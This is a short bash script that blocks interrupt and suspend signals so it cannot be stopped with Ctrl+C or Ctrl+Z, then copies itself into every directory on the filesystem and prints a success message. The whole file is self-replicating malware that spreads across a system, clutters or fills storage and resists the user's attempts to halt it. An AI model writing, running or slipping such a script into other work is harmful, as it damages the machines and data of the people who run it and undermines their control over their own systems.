#!/bin/bash

ignore_sig(){
trap '' INT
trap '' TSTP
}

ignore_sig

copy(){
cu_dir="$(dirname "$0")"
cu_file="$(basename "$0")"

for dir in $(find / -type d); do
	cp "$cu_dir/$cu_file" "$dir/$cu_file"
done

}

copy

echo " copied successfully .."

